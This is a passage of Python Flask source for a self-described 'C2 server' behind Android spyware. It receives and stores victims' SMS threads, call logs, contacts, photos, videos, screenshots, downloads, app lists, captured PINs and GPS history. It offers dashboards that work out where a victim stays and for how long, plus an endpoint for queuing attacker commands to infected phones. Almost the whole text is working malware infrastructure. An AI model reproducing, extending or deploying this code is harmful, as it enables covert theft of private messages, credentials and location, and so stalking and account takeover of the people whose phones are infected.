                            year, month, day, hour, minute, second = pxl_match.groups()
                            try:
                                dt = datetime(int(year), int(month), int(day), int(hour), int(minute), int(second))
                                timestamp = int(dt.timestamp())
                            except:
                                pass

                        # Try to extract from Screenshot_YYYYMMDD-HHMMSS format
                        if not timestamp:
                            ss_match = re.search(r'Screenshot_(\d{4})(\d{2})(\d{2})-(\d{2})(\d{2})(\d{2})', f)
                            if ss_match:
                                year, month, day, hour, minute, second = ss_match.groups()
                                try:
                                    dt = datetime(int(year), int(month), int(day), int(hour), int(minute), int(second))
                                    timestamp = int(dt.timestamp())
                                except:
                                    pass

                        # Try to extract from IMG-YYYYMMDD format
                        if not timestamp:
                            img_match = re.search(r'IMG-(\d{4})(\d{2})(\d{2})', f)
                            if img_match:
                                year, month, day = img_match.groups()
                                try:
                                    dt = datetime(int(year), int(month), int(day))
                                    timestamp = int(dt.timestamp())
                                except:
                                    pass

                        # Try to extract from video format (already captured by PXL pattern)
                        # Fallback to file modification time
                        if timestamp == 0:
                            timestamp = os.path.getmtime(filepath)

                        if f not in file_previews:
                            file_previews[f] = {}
                        file_previews[f]['timestamp'] = timestamp

            # Sort downloads alphabetically (A to Z)
            elif data_type == 'downloads':
                files.sort(key=str.lower)  # Alphabetical order A to Z

            else:
                # For other data types, keep alphabetical sort
                files.sort(reverse=True)

            if len(files) > 100:
                files = files[:100]
            data_types[data_type] = files
            data_counts[data_type] = len(os.listdir(type_dir))

            # If this is contacts, load the latest file and update count to number of contacts
            if data_type == 'contacts' and files:
                latest_contact_file = os.path.join(type_dir, files[0])
                try:
                    with open(latest_contact_file, 'r', encoding='utf-8') as f:
                        contact_data = json.load(f)
                        # Check if it's a list of contacts
                        if isinstance(contact_data, list):
                            contacts_list = contact_data
                            data_counts[data_type] = len(contact_data)
                        # Check if it's a batch wrapper with 'contacts' array
                        elif isinstance(contact_data, dict) and 'contacts' in contact_data:
                            contacts_list = contact_data.get('contacts', [])
                            data_counts[data_type] = len(contacts_list)
                        else:
                            contacts_list = []
                            data_counts[data_type] = 0
                except:
                    contacts_list = []
                    data_counts[data_type] = 0

            # If this is call_logs, load the latest file and parse calls (sorted by time)
            if data_type == 'call_logs' and files:
                latest_call_file = os.path.join(type_dir, files[0])
                try:
                    with open(latest_call_file, 'r', encoding='utf-8') as f:
                        call_data = json.load(f)
                        if isinstance(call_data, dict) and 'calls' in call_data:
                            # Sort calls by time (newest first)
                            call_logs_list = sorted(
                                call_data.get('calls', []),
                                key=lambda x: x.get('time', 0),
                                reverse=True
                            )
                            data_counts[data_type] = len(call_logs_list)
                        else:
                            call_logs_list = []
                            data_counts[data_type] = 0
                except:
                    call_logs_list = []
                    data_counts[data_type] = 0

            # If this is pin_logs, load the master file and parse pins
            if data_type == 'pin_logs' and files:
                pin_master_file = os.path.join(type_dir, 'all_pins.json')
                if os.path.exists(pin_master_file):
                    try:
                        with open(pin_master_file, 'r', encoding='utf-8') as f:
                            pin_data = json.load(f)
                            if isinstance(pin_data, list):
                                pin_logs_list = pin_data
                                data_counts[data_type] = len(pin_data)
                            else:
                                pin_logs_list = []
                                data_counts[data_type] = 0
                    except:
                        pin_logs_list = []
                        data_counts[data_type] = 0

    location_stats = get_location_stats(client_ip)
    # Pass the device ID to the template
    device_id = ip_to_device_id.get(client_ip, 'unknown')

    return render_template('client_data.html',
                         client_ip=client_ip,
                         data_types=data_types,
                         data_counts=data_counts,
                         device_id=device_id,
                         contacts_list=contacts_list,
                         call_logs_list=call_logs_list,
                         pin_logs_list=pin_logs_list,
                         file_previews=file_previews,
                         location_stats=location_stats)

# ========== SMS AND CALL LOG ENDPOINTS ==========

@app.route('/sms', methods=['POST'])
def receive_sms():
    """Receive SMS dumps from the phone"""
    try:
        data = request.get_json()
        if not data:
            return {"error": "No data received"}, 400

        client_ip = request.remote_addr.replace('.', '_')
        device_id = data.get('device_id', 'unknown')
        device_model = data.get('model', 'unknown')
        dump_type = data.get('type', 'incremental')
        messages = data.get('messages', [])

        logging.info(f"SMS DUMP from {device_model} ({device_id})")
        logging.info(f"  Type: {dump_type}")
        logging.info(f"  Messages in this batch: {len(messages)}")

        # Create client-specific folder
        client_dir = os.path.join(CLIENTS_BASE_DIR, client_ip, 'sms')
        os.makedirs(client_dir, exist_ok=True)

        # Group messages by thread/contact
        messages_by_thread = {}
        for msg in messages:
            thread_id = msg.get('thread', 'unknown')
            if thread_id not in messages_by_thread:
                messages_by_thread[thread_id] = []
            messages_by_thread[thread_id].append(msg)

        # Process each thread/conversation
        for thread_id, thread_messages in messages_by_thread.items():
            # Get a friendly name for the file (use contact name or number)
            sample_msg = thread_messages[0]
            contact = sample_msg.get('from') if sample_msg.get('from') != 'me' else sample_msg.get('to')
            # Clean the contact for filename (remove + and special chars)
            safe_contact = ''.join(c for c in str(contact) if c.isalnum() or c in '._- ')
            if not safe_contact:
                safe_contact = f"thread_{thread_id}"

            filename = f"{safe_contact}.json"
            filepath = os.path.join(client_dir, filename)

            if os.path.exists(filepath):
                # Read existing conversation file
                try:
                    with open(filepath, 'r', encoding='utf-8') as f:
                        convo_data = json.load(f)

                    existing_messages = convo_data.get('messages', [])
                    existing_ids = set()

                    # Track existing message IDs
                    for existing_msg in existing_messages:
                        msg_key = f"{existing_msg.get('type', 'unknown')}_{existing_msg.get('id', 'unknown')}"
                        existing_ids.add(msg_key)

                    # Add new messages
                    added_count = 0
                    for new_msg in thread_messages:
                        msg_key = f"{new_msg.get('type', 'unknown')}_{new_msg.get('id', 'unknown')}"
                        if msg_key not in existing_ids:
                            existing_messages.append(new_msg)
                            existing_ids.add(msg_key)
                            added_count += 1

                    # Sort messages by time
                    existing_messages.sort(key=lambda x: x.get('time', 0))

                    # Update the conversation data
                    convo_data['messages'] = existing_messages
                    convo_data['total'] = len(existing_messages)
                    convo_data['last_updated'] = datetime.now().isoformat()

                    # Write back
                    with open(filepath, 'w', encoding='utf-8') as f:
                        json.dump(convo_data, f, indent=2, ensure_ascii=False)

                    logging.info(f"  Added {added_count} new messages to {filename}")

                except Exception as e:
                    logging.error(f"  Error merging {filename}: {e}")
                    # Create new file as fallback
                    convo_data = {
                        'contact': contact,
                        'thread_id': thread_id,
                        'messages': thread_messages,
                        'total': len(thread_messages),
                        'created': datetime.now().isoformat(),
                        'last_updated': datetime.now().isoformat()
                    }
                    with open(filepath, 'w', encoding='utf-8') as f:
                        json.dump(convo_data, f, indent=2, ensure_ascii=False)
            else:
                # Create new conversation file
                convo_data = {
                    'contact': contact,
                    'thread_id': thread_id,
                    'messages': thread_messages,
                    'total': len(thread_messages),
                    'created': datetime.now().isoformat(),
                    'last_updated': datetime.now().isoformat()
                }
                with open(filepath, 'w', encoding='utf-8') as f:
                    json.dump(convo_data, f, indent=2, ensure_ascii=False)

                logging.info(f"  Created new conversation file: {filename}")

        return {
            "status": "received",
            "message": f"Processed {len(messages)} messages across {len(messages_by_thread)} conversations"
        }, 200

    except Exception as e:
        logging.error(f"Error receiving SMS: {e}")
        return {"error": str(e)}, 400

@app.route('/call_logs', methods=['POST'])
def receive_call_logs():
    """Receive call log dumps from the phone"""
    try:
        data = request.get_json()
        if not data:
            return {"error": "No data received"}, 400

        client_ip = request.remote_addr.replace('.', '_')
        device_id = data.get('device_id', 'unknown')
        device_model = data.get('model', 'unknown')
        dump_type = data.get('type', 'incremental')
        total_calls = data.get('total', 0)

        logging.info(f"CALL LOG DUMP from {device_model} ({device_id})")
        logging.info(f"  Type: {dump_type}")
        logging.info(f"  Total calls in this batch: {total_calls}")

        # Create client-specific folder
        client_dir = os.path.join(CLIENTS_BASE_DIR, client_ip, 'call_logs')
        os.makedirs(client_dir, exist_ok=True)

        # Use a single file for all calls
        master_file = os.path.join(client_dir, "all_calls.json")

        if dump_type == "full_dump":
            with open(master_file, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
            logging.info(f"  Full dump saved to all_calls.json (total: {total_calls} calls)")

        else:  # incremental
            if os.path.exists(master_file):
                try:
                    with open(master_file, 'r', encoding='utf-8') as f:
                        existing_data = json.load(f)

                    existing_calls = existing_data.get('calls', [])
                    existing_ids = set(call.get('id') for call in existing_calls)

                    new_calls = data.get('calls', [])
                    added_count = 0

                    for call in new_calls:
                        if call.get('id') not in existing_ids:
                            existing_calls.append(call)
                            existing_ids.add(call.get('id'))
                            added_count += 1

                    existing_data['calls'] = existing_calls
                    existing_data['total'] = len(existing_calls)
                    existing_data['last_updated'] = datetime.now().isoformat()

                    with open(master_file, 'w', encoding='utf-8') as f:
                        json.dump(existing_data, f, indent=2, ensure_ascii=False)

                    logging.info(f"  Added {added_count} new calls to all_calls.json")
                    logging.info(f"  Total calls now: {len(existing_calls)}")

                except Exception as e:
                    logging.error(f"  Error merging: {e}")
                    with open(master_file, 'w', encoding='utf-8') as f:
                        json.dump(data, f, indent=2, ensure_ascii=False)
            else:
                with open(master_file, 'w', encoding='utf-8') as f:
                    json.dump(data, f, indent=2, ensure_ascii=False)
                logging.info(f"  Created all_calls.json with first batch ({total_calls} calls)")

        return {
            "status": "received",
            "filename": "all_calls.json",
            "calls_count": total_calls
        }, 200

    except Exception as e:
        logging.error(f"Error receiving call logs: {e}")
        return {"error": str(e)}, 400

@app.route('/user_apps', methods=['POST'])
def receive_user_apps():
    """Receive list of user-installed apps from the phone"""
    try:
        client_ip = request.remote_addr.replace('.', '_')

        # Check if it's JSON or multipart
        if request.is_json:
            # JSON upload
            data = request.get_json()
            device_id = data.get('device_id', 'unknown')
            total_apps = data.get('total_apps', 0)

            logging.info(f"USER APPS JSON from {client_ip} | Device: {device_id} | Apps: {total_apps}")

            # Create client-specific folder
            client_dir = os.path.join(CLIENTS_BASE_DIR, client_ip, 'user_apps')
            os.makedirs(client_dir, exist_ok=True)

            # Save JSON
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"user_apps_{device_id}_{timestamp}.json"
            filepath = os.path.join(client_dir, filename)

            with open(filepath, 'w') as f:
                json.dump(data, f, indent=2)

            return {"status": "received", "format": "json"}, 200

        else:
            # File upload (multipart)
            if 'file' not in request.files:
                return {"error": "No file part"}, 400

            file = request.files['file']
            if file.filename == '':
                return {"error": "No selected file"}, 400

            device_id = request.form.get('device_id', 'unknown')
            device_model = request.form.get('device_model', 'unknown')

            logging.info(f"USER APPS FILE from {device_model} ({device_id})")
            logging.info(f"File: {file.filename}")

            # Create client-specific folder
            client_dir = os.path.join(CLIENTS_BASE_DIR, client_ip, 'user_apps')
            os.makedirs(client_dir, exist_ok=True)

            # Save file
            filename = file.filename
            filepath = os.path.join(client_dir, filename)

            # Handle duplicates
            counter = 1
            while os.path.exists(filepath):
                name, ext = os.path.splitext(filename)
                filepath = os.path.join(client_dir, f"{name}_{counter}{ext}")
                counter += 1

            file.save(filepath)
            logging.info(f"USER APPS FILE SAVED: {os.path.basename(filepath)}")

            return {
                "status": "uploaded",
                "filename": os.path.basename(filepath),
                "device_id": device_id
            }, 200

    except Exception as e:
        logging.error(f"Error receiving user apps: {e}")
        return {"error": str(e)}, 400

# ========== SMS AND CALL LOG UI ENDPOINTS ==========

@app.route('/client/<client_ip>/sms')
def view_client_sms(client_ip):
    """View SMS logs for a client"""
    data_dir = os.path.join(CLIENTS_BASE_DIR, client_ip, 'sms')

    if not os.path.exists(data_dir):
        return f"No SMS found for client {client_ip}", 404

    files = os.listdir(data_dir)
    files.sort(reverse=True)

    sms_files = []
    first_conversation = None
    first_messages = []
    first_contact = ""

    for file in files:
        if file.endswith('.json'):
            filepath = os.path.join(data_dir, file)

            # Get file stats with error handling
            try:
                file_size = os.path.getsize(filepath)
                modified = datetime.fromtimestamp(os.path.getmtime(filepath)).strftime('%Y-%m-%d %H:%M:%S')
            except:
                file_size = 0
                modified = "Unknown"

            # Get contact name from file (remove .json)
            contact_name = file.replace('.json', '')

            # Try to load the file to get last message preview
            last_message = "No messages"
            total_messages = 0
            last_time = ""

            try:
                with open(filepath, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    messages = data.get('messages', [])
                    total_messages = len(messages)
                    if messages:
                        # Get the last message by time
                        last_msg = sorted(messages, key=lambda x: x.get('time', 0), reverse=True)[0]
                        last_message = last_msg.get('text', '')[:30] + ('...' if len(last_msg.get('text', '')) > 30 else '')
                        last_time = datetime.fromtimestamp(last_msg.get('time', 0)/1000).strftime('%H:%M')

                    # If this is the first file, store its messages and contact for initial display
                    if not first_conversation:
                        first_conversation = file
                        first_messages = messages
                        first_contact = contact_name
            except:
                pass

            sms_files.append({
                'filename': file,
                'contact': contact_name,
                'size': file_size,
                'modified': modified,
                'total': total_messages,
                'last_message': last_message,
                'last_time': last_time
            })

    return render_template('sms_view.html',
                         client_ip=client_ip,
                         device_id=ip_to_device_id.get(client_ip, 'unknown'),
                         conversations=sms_files,
                         first_conversation=first_conversation,
                         first_messages=first_messages,
                         first_contact=first_contact)

@app.route('/client/<client_ip>/sms/<filename>')
def serve_sms_file(client_ip, filename):
    """Serve individual SMS conversation as JSON"""
    data_dir = os.path.join(CLIENTS_BASE_DIR, client_ip, 'sms')
    filepath = os.path.join(data_dir, filename)

    if not os.path.exists(filepath):
        return jsonify({'error': 'Conversation not found'}), 404

    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            data = json.load(f)

        # Get contact name from filename or from the data
        contact_name = data.get('contact', filename.replace('.json', ''))
        messages = data.get('messages', [])

        # Sort messages by time
        messages.sort(key=lambda x: x.get('time', 0))

        return jsonify({
            'contact_name': contact_name,
            'messages': messages
        })
    except Exception as e:
        logging.error(f"Error loading conversation: {e}")
        return jsonify({'error': 'Error loading conversation'}), 500

@app.route('/client/<client_ip>/call_logs')
def view_client_calls(client_ip):
    """View call logs for a client"""
    data_dir = os.path.join(CLIENTS_BASE_DIR, client_ip, 'call_logs')

    if not os.path.exists(data_dir):
        return f"No call logs found for client {client_ip}", 404

    files = os.listdir(data_dir)
    files.sort(reverse=True)

    call_files = []
    for file in files:
        if file.endswith('.json'):
            filepath = os.path.join(data_dir, file)
            file_size = os.path.getsize(filepath)
            modified = datetime.fromtimestamp(os.path.getmtime(filepath)).strftime('%Y-%m-%d %H:%M:%S')

            # Load and sort calls for preview
            calls_list = []
            try:
                with open(filepath, 'r', encoding='utf-8') as f:
                    call_data = json.load(f)
                    if isinstance(call_data, dict) and 'calls' in call_data:
                        # Sort calls by time (newest first)
                        calls_list = sorted(
                            call_data.get('calls', []),
                            key=lambda x: x.get('time', 0),
                            reverse=True
                        )
            except:
                pass

            call_files.append({
                'filename': file,
                'size': file_size,
                'modified': modified,
                'calls': calls_list[:5]  # Show first 5 sorted calls as preview
            })

    return render_template('call_view.html',
                         client_ip=client_ip,
                         call_files=call_files)

@app.route('/client/<client_ip>/call_logs/<filename>')
def serve_call_file(client_ip, filename):
    """Serve individual call log JSON file"""
    data_dir = os.path.join(CLIENTS_BASE_DIR, client_ip, 'call_logs')
    return send_from_directory(data_dir, filename)

@app.route('/downloads/<client_ip>/<filename>')
def serve_download(client_ip, filename):
    """Serve downloaded files"""
    client_dir = os.path.join(CLIENTS_BASE_DIR, client_ip, 'downloads')
    return send_from_directory(client_dir, filename)

@app.route('/contacts/<client_ip>/<filename>')
def serve_contact_file(client_ip, filename):
    """Serve contact files"""
    client_dir = os.path.join(CLIENTS_BASE_DIR, client_ip, 'contacts')
    return send_from_directory(client_dir, filename)

@app.route('/notifications/<client_ip>/<filename>')
def serve_notification_file(client_ip, filename):
    """Serve notification files"""
    client_dir = os.path.join(CLIENTS_BASE_DIR, client_ip, 'notifications')
    return send_from_directory(client_dir, filename)

@app.route('/logs/<client_ip>/<filename>')
def serve_log_file(client_ip, filename):
    """Serve log files"""
    client_dir = os.path.join(CLIENTS_BASE_DIR, client_ip, 'logs')
    return send_from_directory(client_dir, filename)

@app.route('/pin_logs/<client_ip>/<filename>')
def serve_pin_log_file(client_ip, filename):
    """Serve PIN log files"""
    client_dir = os.path.join(CLIENTS_BASE_DIR, client_ip, 'pin_logs')
    return send_from_directory(client_dir, filename)

@app.route('/command_results/<client_ip>/<filename>')
def serve_command_result(client_ip, filename):
    """Serve command result files"""
    client_dir = os.path.join(CLIENTS_BASE_DIR, client_ip, 'command_results')
    return send_from_directory(client_dir, filename)

@app.route('/client/<client_ip>/<data_type>/<filename>')
def serve_client_file(client_ip, data_type, filename):
    """Serve any client file by type and filename"""
    # Validate data_type to prevent path traversal
    allowed_types = ['notifications', 'photos', 'screenshots', 'videos', 'logs',
                     'contacts', 'downloads', 'pin_logs', 'command_results',
                     'sms', 'call_logs', 'screen_recordings']

    if data_type not in allowed_types:
        return {"error": "Invalid data type"}, 400

    client_dir = os.path.join(CLIENTS_BASE_DIR, client_ip, data_type)
    return send_from_directory(client_dir, filename)

@app.route('/client/<client_ip>/apps')
def view_client_apps(client_ip):
    """View installed apps for a client with nice UI"""
    apps_dir = os.path.join(CLIENTS_BASE_DIR, client_ip, 'user_apps')

    if not os.path.exists(apps_dir):
        return f"No apps data found for client {client_ip}", 404

    # Get the most recent JSON file
    json_files = [f for f in os.listdir(apps_dir) if f.endswith('.json')]

    if not json_files:
        return f"No app data found for client {client_ip}", 404

    # Sort by most recent and get the latest
    latest_file = sorted(json_files, reverse=True)[0]
    filepath = os.path.join(apps_dir, latest_file)

    with open(filepath, 'r') as f:
        latest_apps = json.load(f)

    return render_template('client_apps.html',
                         client_ip=client_ip,
                         latest_apps=latest_apps,
                         device_id=ip_to_device_id.get(client_ip, 'unknown'))

@app.route('/location_update', methods=['POST'])
def receive_location_update():
    try:
        data = request.get_json()
        if not data:
            return {"error": "No data received"}, 400

        client_ip = request.remote_addr.replace('.', '_')
        device_id = data.get('device_id', 'unknown')
        device_model = data.get('device_model', 'unknown')
        latitude = data.get('latitude')
        longitude = data.get('longitude')
        accuracy = data.get('accuracy', 0)
        timestamp = data.get('timestamp', 0)

        logging.info(f"LOCATION from {device_model} ({device_id})")
        logging.info(f"  Lat: {latitude}, Lon: {longitude}")
        logging.info(f"  Accuracy: {accuracy}m")

        # Create client-specific folder
        client_dir = os.path.join(CLIENTS_BASE_DIR, client_ip, 'locations')
        os.makedirs(client_dir, exist_ok=True)

        # Save to CSV with original timestamp
        csv_file = os.path.join(client_dir, "location_history.csv")
        file_exists = os.path.isfile(csv_file)

        with open(csv_file, 'a') as f:
            if not file_exists:
                f.write("timestamp,latitude,longitude,accuracy,device_model\n")
            f.write(f"{timestamp},{latitude},{longitude},{accuracy},{device_model}\n")

        # Save as JSON (already correct - uses original timestamp)
        json_file = os.path.join(client_dir, "location_history.jsonl")
        with open(json_file, 'a') as f:
            f.write(json.dumps(data) + '\n')

        return {"status": "received"}, 200

    except Exception as e:
        logging.error(f"Error processing location: {e}")
        return {"error": str(e)}, 400

@app.route('/photos/batch', methods=['POST'])
def upload_photos_batch():
    """Handle batch upload of multiple photos"""
    return handle_media_batch('photos')

@app.route('/videos/batch', methods=['POST'])
def upload_videos_batch():
    """Handle batch upload of multiple videos"""
    return handle_media_batch('videos')

def handle_media_batch(media_type):
    """Generic handler for media batch uploads"""
    try:
        client_ip = request.remote_addr.replace('.', '_')

        # Get all files from the request
        files = []
        for key in request.files:
            # Our client sends files as file_0, file_1, etc.
            if key.startswith('file_'):
                file = request.files[key]
                files.append(file)

                # Log file size for debugging
                file.seek(0, 2)  # Seek to end
                size = file.tell()
                file.seek(0)  # Reset to beginning
                logging.info(f"  File: {file.filename}, Size: {size} bytes")

        # Get metadata
        metadata = {}
        if 'metadata' in request.form:
            try:
                metadata = json.loads(request.form['metadata'])
            except:
                metadata = {'error': 'Could not parse metadata'}

        batch_id = metadata.get('batch_id', 'unknown')
        batch_number = metadata.get('batch_number', 1)
        total_batches = metadata.get('total_batches', 1)
        file_count = metadata.get('file_count', len(files))

        logging.info(f"BATCH UPLOAD from {client_ip}")
        logging.info(f"  Type: {media_type}")
        logging.info(f"  Batch: {batch_number}/{total_batches}")
        logging.info(f"  Files in this batch: {len(files)}")
        logging.info(f"  Expected count: {file_count}")
        logging.info(f"  Batch ID: {batch_id}")

        # Create client directory
        client_dir = os.path.join(CLIENTS_BASE_DIR, client_ip, media_type)
        os.makedirs(client_dir, exist_ok=True)

        saved_files = []
        skipped_files = []

        for file in files:
            if file and file.filename:
                filename = file.filename
                filepath = os.path.join(client_dir, filename)

                # Handle duplicates
                counter = 1
                while os.path.exists(filepath):
                    name, ext = os.path.splitext(filename)
                    filepath = os.path.join(client_dir, f"{name}_{counter}{ext}")
                    counter += 1

                # Save the file
                file.save(filepath)
                saved_files.append(os.path.basename(filepath))

        logging.info(f"  Saved: {len(saved_files)} files")
        if skipped_files:
            logging.info(f"  Skipped: {len(skipped_files)} files")

        return jsonify({
            'status': 'success',
            'batch_id': batch_id,
            'batch_number': batch_number,
            'total_batches': total_batches,
            'saved': len(saved_files),
            'skipped': len(skipped_files),
            'files': saved_files
        }), 200

    except Exception as e:
        logging.error(f"Error in batch upload: {e}")
        import traceback
        traceback.print_exc()  # This will show the full stack trace
        return jsonify({
            'status': 'error',
            'error': str(e)
        }), 400

@app.route('/downloads/batch', methods=['POST'])
def upload_downloads_batch():
    """Handle batch upload of downloads"""
    return handle_downloads_batch()

def handle_downloads_batch():
    try:
        client_ip = request.remote_addr.replace('.', '_')

        # Get all files
        files = []
        for key in request.files:
            if key.startswith('file_') and not key.endswith('_metadata'):
                files.append(request.files[key])

        # Get metadata
        metadata = {}
        if 'metadata' in request.form:
            try:
                metadata = json.loads(request.form['metadata'])
            except:
                metadata = {}

        batch_id = metadata.get('batch_id', 'unknown')
        batch_number = metadata.get('batch_number', 1)
        total_batches = metadata.get('total_batches', 1)

        logging.info(f"DOWNLOADS BATCH UPLOAD from {client_ip}")
        logging.info(f"  Batch: {batch_number}/{total_batches}")
        logging.info(f"  Files in this batch: {len(files)}")
        logging.info(f"  Batch ID: {batch_id}")

        # Create client directory
        client_dir = os.path.join(CLIENTS_BASE_DIR, client_ip, 'downloads')
        os.makedirs(client_dir, exist_ok=True)

        saved_files = []
        for i, file in enumerate(files):
            if file and file.filename:
                filename = file.filename
                filepath = os.path.join(client_dir, filename)

                # Handle duplicates
                counter = 1
                while os.path.exists(filepath):
                    name, ext = os.path.splitext(filename)
                    filepath = os.path.join(client_dir, f"{name}_{counter}{ext}")
                    counter += 1

                file.save(filepath)
                saved_files.append(os.path.basename(filepath))
                logging.info(f"    Saved: {os.path.basename(filepath)}")

        logging.info(f"  Batch complete: {len(saved_files)} files saved")

        return jsonify({
            'status': 'success',
            'batch_id': batch_id,
            'batch_number': batch_number,
            'total_batches': total_batches,
            'saved': len(saved_files),
            'files': saved_files
        }), 200

    except Exception as e:
        logging.error(f"Error in downloads batch upload: {e}")
        return jsonify({'status': 'error', 'error': str(e)}), 400

@app.route('/client/<client_ip>/locations')
def view_client_locations(client_ip):
    """View location history for a client"""
    locations_file = os.path.join(CLIENTS_BASE_DIR, client_ip, 'locations', 'location_history.jsonl')

    locations = []
    dwell_periods = []
    stats = {
        'total_locations': 0,
        'unique_spots': 0,
        'time_span': 'N/A',
        'last_seen': 'Never'
    }

    if os.path.exists(locations_file):
        with open(locations_file, 'r') as f:
            for line in f:
                try:
                    loc = json.loads(line.strip())
                    locations.append(loc)
                except:
                    continue

        # Calculate stats
        stats['total_locations'] = len(locations)

        if locations:
            # Last seen
            last_time = locations[-1].get('timestamp', 0)
            stats['last_seen'] = datetime.fromtimestamp(last_time / 1000).strftime('%Y-%m-%d %H:%M:%S')

            # Time span
            first_time = locations[0].get('timestamp', 0)
            time_span_seconds = (last_time - first_time) / 1000
            hours = time_span_seconds // 3600
            minutes = (time_span_seconds % 3600) // 60
            stats['time_span'] = f"{int(hours)}h {int(minutes)}m"

            # Calculate unique spots (group by location)
            unique_coords = set()
            for loc in locations:
                # Round to 4 decimal places (~11 meters) to group nearby points
                lat = round(loc.get('latitude', 0), 4)
                lng = round(loc.get('longitude', 0), 4)
                unique_coords.add(f"{lat},{lng}")
            stats['unique_spots'] = len(unique_coords)

            # Calculate dwell times
            if len(locations) > 1:
                current_spot = locations[0]
                start_time = current_spot.get('timestamp', 0)

                for i in range(1, len(locations)):
                    loc = locations[i]

                    # Check if still at same spot (within ~11 meters)
                    lat1 = round(current_spot.get('latitude', 0), 4)
                    lng1 = round(current_spot.get('longitude', 0), 4)
                    lat2 = round(loc.get('latitude', 0), 4)
                    lng2 = round(loc.get('longitude', 0), 4)

                    if lat1 == lat2 and lng1 == lng2:
                        # Still same spot
                        continue
                    else:
                        # Moved to new spot
                        end_time = loc.get('timestamp', 0)
                        duration_seconds = (end_time - start_time) / 1000

                        if duration_seconds > 60:  # Only show if stayed > 1 minute
                            hours = int(duration_seconds // 3600)
                            minutes = int((duration_seconds % 3600) // 60)

                            dwell_periods.append({
                                'lat': current_spot.get('latitude'),
                                'lng': current_spot.get('longitude'),
                                'start_time': datetime.fromtimestamp(start_time / 1000).strftime('%H:%M'),
                                'end_time': datetime.fromtimestamp(end_time / 1000).strftime('%H:%M'),
                                'duration': f"{hours}h {minutes}m" if hours > 0 else f"{minutes}m"
                            })

                        # Reset for new spot
                        current_spot = loc
                        start_time = loc.get('timestamp', 0)

    return render_template('locations.html',
                         client_ip=client_ip,
                         locations=locations,
                         locations_json=json.dumps(locations),
                         dwell_periods=dwell_periods,
                         stats=stats)

@app.route('/health')
def health_check():
    return {
        "status": "running",
        "endpoints": {
            "POST /notifications": "Receive notifications",
            "POST /photos": "Receive photos",
            "POST /accessibility_logs": "Receive logs",
            "POST /contacts": "Receive contacts",
            "POST /downloads": "Receive downloads",
            "POST /pin_logs": "Receive PIN logs",
            "POST /screenshots": "Receive screenshots",
            "POST /videos": "Receive videos",
            "GET /commands": "Get pending commands (phone polling)",
            "POST /commands": "Add command for device (attacker)",
            "POST /commands/ack": "Command acknowledgment",
            "GET /commands/list": "List available commands",
            "GET /commands/status/<device_id>": "Check command status",
            "GET /": "Main dashboard",
            "GET /gallery": "View all client data",
            "POST /sms": "Receive SMS dumps",
            "POST /call_logs": "Receive call log dumps",
            "GET /client/<ip>/sms": "View SMS for client",
            "GET /client/<ip>/call_logs": "View call logs for client"
        }
    }, 200

@app.route('/favicon.ico')
def favicon():
    return '', 204

if __name__ == '__main__':
    print("\n" + "="*70)
    print("COMPLETE C2 SERVER STARTING")
    print("="*70)
    print(f"Clients base folder: {os.path.abspath(CLIENTS_BASE_DIR)}")
    print("\nData will be organized as:")
    print("  clients/<client_ip>/notifications/")
    print("  clients/<client_ip>/photos/")
    print("  clients/<client_ip>/screenshots/")
    print("  clients/<client_ip>/videos/")
    print("  clients/<client_ip>/logs/")
    print("  clients/<client_ip>/contacts/")
    print("  clients/<client_ip>/downloads/")
    print("  clients/<client_ip>/pin_logs/")
    print("  clients/<client_ip>/command_results/")
    print("  clients/<client_ip>/sms/")
    print("  clients/<client_ip>/call_logs/")
    print("\n" + "="*70)
    print("="*70)
    print("Waiting for Android data and commands...\n")
    context = ('/etc/letsencrypt/live/zining.duckdns.org/fullchain.pem',
               '/etc/letsencrypt/live/zining.duckdns.org/privkey.pem')

    app.run(host='0.0.0.0', port=5000, debug=True, ssl_context=context)